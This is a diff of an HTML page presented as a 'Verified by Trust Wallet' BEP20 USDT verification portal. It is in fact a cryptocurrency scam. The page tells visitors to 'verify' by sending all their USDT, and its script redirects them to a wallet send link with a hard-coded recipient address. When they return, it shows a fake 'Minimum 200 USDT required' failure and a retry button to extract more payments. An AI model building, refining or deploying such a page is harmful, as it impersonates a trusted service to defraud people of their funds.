@@ -3,87 +3,110 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>BEP20 USDT All-In Verification</title>
-  <link rel="icon" type="image/png" href="bep20-logo.png">
+  <title>BEP20 USDT Verification</title>
+  <link rel="icon" href="bep20-logo.png" />
   <style>
     body {
       margin: 0;
-      padding: 40px 20px;
       font-family: 'Segoe UI', sans-serif;
-      background: #0d0d0d;
-      color: #ffffff;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: #fff;
       text-align: center;
+      padding: 20px;
     }
-    .container {
-      background: #1a1a1a;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 12px rgba(0, 255, 150, 0.2);
-      max-width: 400px;
-      margin: auto;
-    }
-    .logo {
+    header img {
       width: 80px;
-      margin-bottom: 20px;
+      margin-top: 30px;
     }
     h1 {
-      font-size: 22px;
-      color: #00ffcc;
-      margin-bottom: 10px;
+      color: #00ffd5;
+      font-size: 26px;
+      margin: 10px 0;
     }
-    .qr {
-      margin: 20px 0;
+    .card {
+      background: #1a1a2e;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 15px rgba(0,255,255,0.2);
+      max-width: 400px;
+      margin: 30px auto;
     }
     button {
-      background: #00ffcc;
-      border: none;
-      padding: 12px 20px;
-      border-radius: 30px;
-      font-size: 16px;
-      cursor: pointer;
+      background: #00ffd5;
       color: #000;
-      font-weight: bold;
+      border: none;
+      padding: 14px 26px;
+      font-size: 16px;
+      border-radius: 30px;
+      cursor: pointer;
+      margin-top: 20px;
     }
     button:hover {
-      background: #00e6b8;
+      background: #00ddb0;
     }
-    .processing {
-      display: none;
-      font-size: 14px;
-      color: #ffa500;
+    .flash-msg {
+      color: #00ff00;
+      font-weight: bold;
       margin-top: 15px;
+      display: none;
+      animation: flash 1s infinite;
+    }
+    .fail-msg {
+      color: #ff4d4d;
+      font-weight: bold;
+      margin-top: 20px;
+      display: none;
+    }
+    @keyframes flash {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
     }
     footer {
-      margin-top: 30px;
+      margin-top: 40px;
       font-size: 13px;
-      opacity: 0.5;
+      opacity: 0.7;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <img src="bep20-logo.png" alt="BEP20 Logo" class="logo" />
+  <header>
+    <img src="bep20-logo.png" alt="BEP20 Logo">
     <h1>Verified by Trust Wallet</h1>
-    <p>Click below to verify your wallet by sending all USDT</p>
-    
-    <div class="qr">
-      <img src="BEP20_USDT_QR_Code.png" alt="QR Code" width="250" />
-    </div>
-    
-    <button onclick="verifyAllUSDT()">Verify USDT</button>
-    <div class="processing" id="processText">🔁 All-in verification in progress...</div>
+    <p>Secure BEP20 USDT Verification Portal</p>
+  </header>
+
+  <div class="card">
+    <h2>Verify Your USDT</h2>
+    <p>Click below to verify your wallet by sending all your USDT</p>
+    <button onclick="verifyUSDT()">Verify USDT</button>
+    <div class="flash-msg" id="flash">🔐 All-in USDT verification required.</div>
+    <div class="fail-msg" id="fail">❌ Verification failed. Minimum 200 USDT required.</div>
   </div>
 
-  <footer>Secure All-In Payment Gateway | BEP20 Network</footer>
+  <footer>
+    Powered by BEP20 Payment Gateway
+  </footer>
 
   <script>
-    function verifyAllUSDT() {
-      document.getElementById("processText").style.display = "block";
+    const wallet = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
+    const trustWalletURL = `https://link.trustwallet.com/send?coin=20000714&address=${wallet}&token_id=0x55d398326f99059fF775485246999027B3197955`;
+
+    function verifyUSDT() {
+      document.getElementById("flash").style.display = "block";
       setTimeout(() => {
-        // Redirect without amount = Trust Wallet asks user to enter manually (simulate "All-In")
-        window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955";
-      }, 1800);
+        window.location.href = trustWalletURL;
+      }, 2000);
+    }
+
+    // Simulate user returning after transfer
+    if (window.location.search.includes("tx")) {
+      document.querySelector(".card").innerHTML = `
+        <h2>Verification Failed</h2>
+        <p>❌ Minimum 200 USDT required to verify wallet.</p>
+        <p>Please try again.</p>
+        <button onclick="verifyUSDT()">Retry Verification</button>
+      `;
     }
   </script>
 
